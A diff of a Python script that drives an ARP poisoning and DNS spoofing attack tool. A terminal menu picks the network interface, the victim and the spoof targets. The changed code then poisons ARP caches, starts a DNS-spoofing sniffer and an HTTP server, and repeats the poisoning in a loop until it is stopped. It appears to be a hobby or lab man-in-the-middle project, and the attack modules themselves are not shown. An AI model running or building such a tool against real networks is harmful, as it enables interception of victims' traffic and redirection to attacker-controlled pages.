@@ -1,14 +1,16 @@
 from __future__ import unicode_literals
-from scapy.all import get_if_list, get_if_addr, get_if_hwaddr, conf
+from scapy.all import get_if_list
 from prompt_toolkit.shortcuts import radiolist_dialog, input_dialog, message_dialog
+from arp_poison import ARPPoisonAttack
+from client import Client
 from netifaces import ifaddresses, AF_INET
 from ipaddress import ip_network
+from dns_spoof import Sniffer
+from time import sleep
+from web import HTTPServer
 
-from utils.network_scan import NetworkScan
-from utils.strings import stu, uts
-from data.config import Config
-from data.client import Client
-from start import start
+from network_scan import NetworkScan
+from utils import stu, uts
 
 # Show GUI, where the user can select the interface they want to use (e.g. enp0s3)
 iface = uts(radiolist_dialog(
@@ -134,12 +136,26 @@ while (not repeatAttackTime.isdigit()):
     if repeatAttackTime == None:
         exit()
 
-config = Config()
+# Execute the arp attack, with the known iface, victim and selected spoof victims.
+arpAttack = ARPPoisonAttack(iface, victim, spoofVictims)
+arpAttack.execute()
 
-config.iface = iface
-config.victim = victim
-config.attacker = Client(get_if_addr(iface), get_if_hwaddr(iface))
-config.gateway = Client.fromIP(conf.route.route("0.0.0.0")[2])
-config.arp_sleep_time = float(repeatAttackTime)
+sniffer = Sniffer(iface, victim, hostNames)
+httpServer = HTTPServer()
 
-start(config)
+print("[*] Start sniffing...")
+sniffer.start()
+
+httpServer.start()
+
+# Repeat attack until the program is stopped (ctrl+c)
+try:
+    while True:
+        sleep(float(repeatAttackTime))
+        arpAttack.execute()
+except KeyboardInterrupt:
+    print("[*] Stop sniffing")
+    sniffer.join(2.0)
+
+    if sniffer.isAlive():
+        sniffer.socket.close()
